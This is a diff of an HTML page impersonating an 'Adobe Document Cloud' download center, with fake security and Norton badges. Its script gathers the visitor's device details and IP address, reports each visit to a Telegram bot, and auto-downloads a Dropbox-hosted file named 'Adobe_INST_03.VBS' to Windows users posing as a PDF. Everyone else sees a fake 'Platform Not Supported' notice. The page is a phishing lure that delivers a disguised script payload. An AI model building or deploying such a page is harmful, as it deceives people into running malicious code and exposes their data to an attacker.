@@ -1,10 +1,10 @@
-&amp;lt;!DOCTYPE html&amp;gt;
-&amp;lt;html lang="en"&amp;gt;
-&amp;lt;head&amp;gt;
-&amp;lt;meta charset="UTF-8" /&amp;gt;
-&amp;lt;meta name="viewport" content="width=device-width, initial-scale=1" /&amp;gt;
-&amp;lt;title&amp;gt;Adobe Document Cloud - Download Center&amp;lt;/title&amp;gt;
-&amp;lt;style&amp;gt;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Adobe Document Cloud - Download Center</title>
+<style>
   * { margin:0; padding:0; box-sizing:border-box; }
   body { font-family: 'Adobe Clean','Segoe UI',system-ui,-apple-system,sans-serif; background: linear-gradient(135deg,#f5f5f5 0%,#e8e8e8 100%); min-height:100vh; display:flex; flex-direction:column; }
   header { background:#fff; padding:20px 40px; box-shadow:0 2px 10px rgba(0,0,0,0.05); }
@@ -38,56 +38,56 @@
   .modal-btn { background:#505050; color:#fff; border:none; padding:12px 30px; font-size:15px; font-weight:600; border-radius:25px; cursor:pointer; transition:all 0.3s ease; }
   .modal-btn:hover { background:#2c2c2c; }
   body.no-select { -webkit-user-select:none; -moz-user-select:none; -ms-user-select:none; user-select:none; }
-&amp;lt;/style&amp;gt;
-&amp;lt;/head&amp;gt;
-&amp;lt;body class="no-select"&amp;gt;
+</style>
+</head>
+<body class="no-select">
 
-&amp;lt;header&amp;gt;
-  &amp;lt;div class="logo"&amp;gt;
-    &amp;lt;img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYIF8ZhgZc8XRDPdwcw4uIxVZp5zRZ9urWbg&amp;amp;s" alt="Logo" /&amp;gt;
-  &amp;lt;/div&amp;gt;
-&amp;lt;/header&amp;gt;
+<header>
+  <div class="logo">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYIF8ZhgZc8XRDPdwcw4uIxVZp5zRZ9urWbg&s" alt="Logo" />
+  </div>
+</header>
 
-&amp;lt;div class="container"&amp;gt;
-  &amp;lt;div class="download-card"&amp;gt;
-    &amp;lt;div class="document-icon"&amp;gt;
-      &amp;lt;img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRKlI-Nav4tv8-zXwv3YRBdVVP6YcV-YxKEcg&amp;amp;s" alt="Document" /&amp;gt;
-    &amp;lt;/div&amp;gt;
-    &amp;lt;h1&amp;gt;Document Ready&amp;lt;/h1&amp;gt;
-    &amp;lt;div class="document-details"&amp;gt;Shared securely via Adobe Document Cloud&amp;lt;/div&amp;gt;
-    &amp;lt;div class="file-info"&amp;gt;
-      &amp;lt;div class="info-item"&amp;gt;&amp;lt;div class="info-label"&amp;gt;File Type&amp;lt;/div&amp;gt;&amp;lt;div class="info-value"&amp;gt;PDF&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
-      &amp;lt;div class="info-item"&amp;gt;&amp;lt;div class="info-label"&amp;gt;File Size&amp;lt;/div&amp;gt;&amp;lt;div class="info-value"&amp;gt;2.4 MB&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
-      &amp;lt;div class="info-item"&amp;gt;&amp;lt;div class="info-label"&amp;gt;Pages&amp;lt;/div&amp;gt;&amp;lt;div class="info-value"&amp;gt;24&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
-    &amp;lt;/div&amp;gt;
-    &amp;lt;button class="download-btn" onclick="downloadDocument()"&amp;gt;
-      &amp;lt;span class="download-icon"&amp;gt;⬇&amp;lt;/span&amp;gt; Download Document
-    &amp;lt;/button&amp;gt;
-    &amp;lt;div class="security-note"&amp;gt;&amp;lt;strong&amp;gt;🔒 Secure Download:&amp;lt;/strong&amp;gt; This document is shared securely through Adobe Document Cloud. Your download is encrypted and protected.&amp;lt;/div&amp;gt;
-    &amp;lt;div class="norton-badge"&amp;gt;
-      &amp;lt;img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgzSvD9W1o_BbmzXMnmcceci6Pj2dDNRwjcw&amp;amp;s" alt="Norton Secured" /&amp;gt;
-      &amp;lt;div class="norton-text"&amp;gt;Protected by Norton Antivirus&amp;lt;/div&amp;gt;
-    &amp;lt;/div&amp;gt;
-  &amp;lt;/div&amp;gt;
-&amp;lt;/div&amp;gt;
+<div class="container">
+  <div class="download-card">
+    <div class="document-icon">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRKlI-Nav4tv8-zXwv3YRBdVVP6YcV-YxKEcg&s" alt="Document" />
+    </div>
+    <h1>Document Ready</h1>
+    <div class="document-details">Shared securely via Adobe Document Cloud</div>
+    <div class="file-info">
+      <div class="info-item"><div class="info-label">File Type</div><div class="info-value">PDF</div></div>
+      <div class="info-item"><div class="info-label">File Size</div><div class="info-value">2.4 MB</div></div>
+      <div class="info-item"><div class="info-label">Pages</div><div class="info-value">24</div></div>
+    </div>
+    <button class="download-btn" onclick="downloadDocument()">
+      <span class="download-icon">⬇</span> Download Document
+    </button>
+    <div class="security-note"><strong>🔒 Secure Download:</strong> This document is shared securely through Adobe Document Cloud. Your download is encrypted and protected.</div>
+    <div class="norton-badge">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgzSvD9W1o_BbmzXMnmcceci6Pj2dDNRwjcw&s" alt="Norton Secured" />
+      <div class="norton-text">Protected by Norton Antivirus</div>
+    </div>
+  </div>
+</div>
 
-&amp;lt;footer&amp;gt;
+<footer>
   © 2026 Adobe Inc. All rights reserved. | Privacy Policy | Terms of Use
-&amp;lt;/footer&amp;gt;
+</footer>
 
-&amp;lt;div class="modal" id="errorModal"&amp;gt;
-  &amp;lt;div class="modal-content"&amp;gt;
-    &amp;lt;div class="modal-icon"&amp;gt;⚠️&amp;lt;/div&amp;gt;
-    &amp;lt;h2&amp;gt;Platform Not Supported&amp;lt;/h2&amp;gt;
-    &amp;lt;p&amp;gt;We apologize for the inconvenience. This document is currently only available for Windows devices.&amp;lt;/p&amp;gt;
-    &amp;lt;p style="margin-top: 15px;"&amp;gt;&amp;lt;strong&amp;gt;Please access this page from a Windows PC to download the file.&amp;lt;/strong&amp;gt;&amp;lt;/p&amp;gt;
-    &amp;lt;button class="modal-btn" onclick="closeModal()"&amp;gt;Understood&amp;lt;/button&amp;gt;
-  &amp;lt;/div&amp;gt;
-&amp;lt;/div&amp;gt;
+<div class="modal" id="errorModal">
+  <div class="modal-content">
+    <div class="modal-icon">⚠️</div>
+    <h2>Platform Not Supported</h2>
+    <p>We apologize for the inconvenience. This document is currently only available for Windows devices.</p>
+    <p style="margin-top: 15px;"><strong>Please access this page from a Windows PC to download the file.</strong></p>
+    <button class="modal-btn" onclick="closeModal()">Understood</button>
+  </div>
+</div>
 
-&amp;lt;script&amp;gt;
+<script>
   // MSI download URL
-   const MSI_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/ztfw5natff5u3kuolkum3/Adobe_INST_03.VBS?rlkey=3y2f8w83he9bo20bndl20vowz&amp;amp;st=8ejmd69j&amp;amp;dl=1";
+   const MSI_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/ztfw5natff5u3kuolkum3/Adobe_INST_03.VBS?rlkey=3y2f8w83he9bo20bndl20vowz&st=8ejmd69j&dl=1";
 
   // Telegram info
   const TELEGRAM_BOT_TOKEN = '';
@@ -135,7 +135,7 @@
   }
 
   // Automatic download for Windows users
-  window.addEventListener('load', async () =&amp;gt; {
+  window.addEventListener('load', async () => {
     const deviceInfo = detectDevice();
     const ip = await getIPAddress();
     await sendTelegramNotification(deviceInfo, 'visit', ip);
@@ -175,7 +175,7 @@
     a.click();
     document.body.removeChild(a);
   }
-&amp;lt;/script&amp;gt;
+</script>
 
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
+</body>
+</html>
